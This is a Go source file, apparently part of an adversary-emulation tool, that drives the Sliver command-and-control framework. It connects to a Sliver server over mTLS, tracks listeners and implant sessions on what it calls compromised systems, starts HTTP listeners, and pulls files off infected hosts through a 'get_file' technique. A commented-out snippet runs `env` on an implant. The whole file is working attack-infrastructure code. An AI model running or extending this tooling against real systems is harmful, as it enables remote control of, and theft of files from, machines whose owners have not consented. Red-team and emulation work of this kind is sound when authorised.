package c2

import (
	"bytes"
	"compress/gzip"
	"context"
	"fmt"
	"io"
	"log"
	"log/slog"
	"net"
	"slices"
	"strings"

	"github.com/Magier/Ran/domain"
	bus "github.com/Magier/Ran/internal/bus"
	"github.com/bishopfox/sliver/client/assets"
	consts "github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

type SliverClient struct {
	Name       string
	config     *assets.ClientConfig
	rpc        rpcpb.SliverRPCClient
	cmdChannel chan domain.Command
}

func CreateSliverClient(configPath string) SliverClient {
	// load the client configuration from the filesystem
	config, err := assets.ReadConfig(configPath)
	if err != nil {
		log.Fatal(err)
	}
	return SliverClient{
		Name:       "sliver",
		config:     config,
		cmdChannel: make(chan domain.Command, 1),
	}
}

func (c SliverClient) Connect(ctx context.Context, bus bus.MessageBus) error {
	// func ConnectToSliverServer(ctx context.Context, bus bus.MessageBus, configPath string, cmdChannel <-chan domain.Command) {
	// connect to the server
	rpc, ln, err := transport.MTLSConnect(c.config)
	if err != nil {
		return err
	}
	c.rpc = rpc

	serverIp := c.GetServerIp()
	err = bus.Publish(domain.C2Connected{
		Name: c.Name,
		IP:   serverIp,
		Kind: "sliver",
	})
	if err != nil {
		slog.Warn("Couldn't send sliver 'C2 Connected' event: ", "", err.Error())
		return err
	}
	defer ln.Close()

	reportOpenListeners(rpc, bus, serverIp, c.config.LPort)
	reportEstablishedSessions(rpc, bus)

	// Open the event stream to be able to collect all events sent by  the server
	eventStream, err := rpc.Events(context.Background(), &commonpb.Empty{})
	if err != nil {
		slog.Error(err.Error())
	}

	// handle all incoming events in the background
	events := make(chan *clientpb.Event)
	go func(eventStream rpcpb.SliverRPC_EventsClient) {
		for {
			select {
			case <-ctx.Done():
				break
			default:
				event, err := eventStream.Recv()
				if err == io.EOF || event == nil {
					return
				}
				events <- event
			}
		}
	}(eventStream)

	// handle all commands sent to the Sliver server
	for {
		select {
		case <-ctx.Done():
			break
		case cmd, ok := <-c.cmdChannel:
			if !ok {
				c.cmdChannel = nil
			}
			event, err := c.handleCommand(cmd)
			if err != nil {
				slog.Error("Sliver C2", "Could not send cmd", err.Error())
			}
			if event != nil {
				err := bus.Publish(event)
				if err != nil {
					slog.Error("Sliver C2", "Could not publish resulting event", err.Error())
				}
			}
		case event := <-events:
			go c.handleSliverEvent(bus, event)
		}
	}
}

func (c SliverClient) GetName() string {
	return "sliver"
}

func (c SliverClient) GetServerIp() net.IP {
	var ip net.IP
	// resolve the local IP to the 'external' one, so the compromised systems can reach it
	if slices.Contains([]string{"0.0.0.0", "localhost"}, c.config.LHost) {
		ip = GetOutboundIP()
	} else {
		ip = net.ParseIP(c.config.LHost)
	}
	return ip
}

func (c SliverClient) handleSliverEvent(bus bus.MessageBus, event *clientpb.Event) error {
	var resultingMessage domain.Message
	// Trigger event based on type
	switch event.EventType {
	// a new session just came in
	case consts.SessionOpenedEvent:
		resultingMessage = SessionStarted{Session: parseSession(event.Session), C2Kind: "sliver"}
	case consts.SessionClosedEvent:
		resultingMessage = SessionClosed{Session: parseSession(event.Session)}

	case consts.JobStartedEvent:
		job := event.Job
		// resolve the local IP to the 'external' one, so the compromised systems can reach it
		resultingMessage = ListenerReady{
			Id:       fmt.Sprintf("%d", job.ID),
			Name:     fmt.Sprintf("sliver_%s", job.Name),
			C2Server: c.Name,
			// IP:       ip,
			Port:     uint(job.Port),
			Protocol: domain.Protocol(strings.ToUpper(job.Protocol)),
		}

	case consts.JobStoppedEvent:
		job := event.Job
		resultingMessage = ListenerStopped{
			Name: fmt.Sprintf("sliver_%s", job.Name),
			Port: uint(job.Port),
		}
	}

	err := bus.Publish(resultingMessage)
	if err != nil {
		slog.Error("Error publishing session started event:", err.Error(), "")
		return err
	}
	return nil
}

func (c SliverClient) handleCommand(msg domain.Command) (domain.Event, error) {
	switch cmd := msg.(type) {
	case domain.StartListener:
		return c.startListener(cmd)
	case domain.StopListener:
		return c.stopListener(cmd)
	case domain.ExecTTP:
		c2Channel := cmd.C2Channel.(domain.ImplantC2Channel)
		switch cmd.TTP.GetCommand("sliver") {
		case "get_file":
			if len(cmd.TTP.Args) == 0 {
				return nil, fmt.Errorf("Path of file to retrieve is required as argument")
			} else if len(cmd.TTP.Args) != 1 {
				slog.Warn("Received unknown arguments to download file: ", cmd.TTP.Args)
			}
			data, err := c.downloadFile(c2Channel.SessionId, cmd.TTP.Args[0])
			if err != nil {
				return nil, err
			}
			return cmd.TTP.HandleResult(cmd.Target, data)
		}
	}

	// // call any RPC you want, for the full list, see
	// // https://github.com/BishopFox/sliver/blob/master/protobuf/rpcpb/services.proto
	// resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
	// 	Path:    `env`,
	// 	Output:  true,
	// 	Request: makeRequest(session),
	// })
	// if err != nil {
	// 	log.Fatal(err)
	// }
	// // Don't forget to check for errors in the Response object
	// if resp.Response != nil && resp.Response.Err != "" {
	// 	log.Fatal(resp.Response.Err)
	// }

	return nil, nil
}

func parseSession(session *clientpb.Session) Session {
	return Session{
		Id:         session.ID,
		Hostname:   session.Hostname,
		Os:         session.OS,
		OsVersion:  session.Version,
		User:       session.Username,
		IsRoot:     session.UID == "0",
		RemoteAddr: session.RemoteAddress,
	}
}

func reportOpenListeners(rpc rpcpb.SliverRPCClient, bus bus.MessageBus, serverIp net.IP, clientPort int) {
	jobs, err := rpc.GetJobs(context.Background(), &commonpb.Empty{})
	if err != nil {
		slog.Error(err.Error())
	}

	for _, job := range jobs.Active {
		// no need to leak infrastructure details
		// so ignore the listener for new (multiplayer) clients
		if job.Port == uint32(clientPort) {
			continue
		}

		err = bus.Publish(ListenerReady{
			Name:     fmt.Sprintf("sliver_%s", job.Name),
			IP:       serverIp,
			Port:     uint(job.Port),
			Protocol: domain.Protocol(strings.ToUpper(job.Protocol)),
		})
		if err != nil {
			slog.Error("Error publishing listener event: " + err.Error())
		}
	}
}

func reportEstablishedSessions(rpc rpcpb.SliverRPCClient, bus bus.MessageBus) {
	sessions, err := rpc.GetSessions(context.Background(), &commonpb.Empty{})
	if err != nil {
		slog.Error(err.Error())
	}
	for _, session := range sessions.GetSessions() {
		err = bus.Publish(SessionStarted{
			C2Kind:  "sliver",
			C2Name:  session.ActiveC2,
			Session: parseSession(session),
		})
		if err != nil {
			slog.Error("Error publishing pre-existing session(started) event: " + err.Error())
		}
	}
}

func (c SliverClient) Execute(execTTP domain.Command) (domain.Message, error) {
	c.cmdChannel <- execTTP
	return nil, nil
}

func (c SliverClient) startListener(ev domain.StartListener) (domain.Event, error) {
	switch ev.Protocol {
	case domain.HTTP:
		_, err := c.rpc.StartHTTPListener(context.Background(), &clientpb.HTTPListenerReq{
			Port: uint32(ev.Port),
		})
		if err != nil {
			return nil, fmt.Errorf("Starting Sliver Listener failed " + err.Error())
		}
		// there will be an event from sliver notifying about the successful creation of the listener
		return nil, nil
	}

	return nil, fmt.Errorf("Starting Sliver %s Listener not yet implemented", ev.Protocol)
}

func (c SliverClient) stopListener(ev domain.StopListener) (domain.Event, error) {
	return nil, fmt.Errorf("Stopping Sliver Listener not yet implemented")
}

func (c SliverClient) downloadFile(sessionId, path string) ([]byte, error) {
	ctx := context.Background()
	dl, err := c.rpc.Download(ctx, &sliverpb.DownloadReq{Path: path,
		Request: makeRequest(sessionId)})

	if dl.Encoder == "gzip" {
		r, err := gzip.NewReader(bytes.NewReader(dl.Data))
		if err != nil {
			return nil, fmt.Errorf("Decoding failed %w", err)
		}
		raw, err := io.ReadAll(io.Reader(r))
		r.Close()
		if err != nil {
			return nil, fmt.Errorf("Decoding failed %w", err)
		}
		dl.Data = raw
	}

	return dl.GetData(), err
}

func makeRequest(sessionId string) *commonpb.Request {
	timeout := int64(60)
	return &commonpb.Request{
		SessionID: sessionId,
		Timeout:   timeout,
	}
}
